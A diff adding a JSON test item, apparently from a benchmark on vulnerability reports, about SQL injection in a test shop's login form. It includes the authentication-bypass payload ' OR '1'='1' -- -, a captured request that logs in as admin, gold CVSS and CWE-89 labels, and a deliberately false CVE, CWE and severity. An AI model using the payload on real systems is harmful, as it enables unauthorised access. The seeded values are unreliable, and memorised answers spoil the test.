@@ -1,0 +1,36 @@
+{
+  "id": "sqli-login",
+  "split": "dev",
+  "title": "SQL injection in login form",
+  "asset": "https://shop.acme.test/login",
+  "notes": "SQL injection on the login form (POST /login, parameter username).\nPayload ' OR '1'='1' -- - in username with any password logs in as admin.\nA single quote in the same parameter returns a MySQL error page.\nTested on staging, no data was modified.",
+  "evidence": [
+    {
+      "name": "burp-login.txt",
+      "text": "POST /login HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/x-www-form-urlencoded\n\nusername=%27+OR+%271%27%3D%271%27+--+-&password=x\n\nHTTP/1.1 302 Found\nLocation: /admin/dashboard",
+      "file": "assets/sqli-login.png"
+    },
+    {
+      "name": "error-page.txt",
+      "text": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cwe": [
+      "89"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 9.8,
+    "severity": "Critical"
+  },
+  "faults": {
+    "cve": "CVE-2099-12345",
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
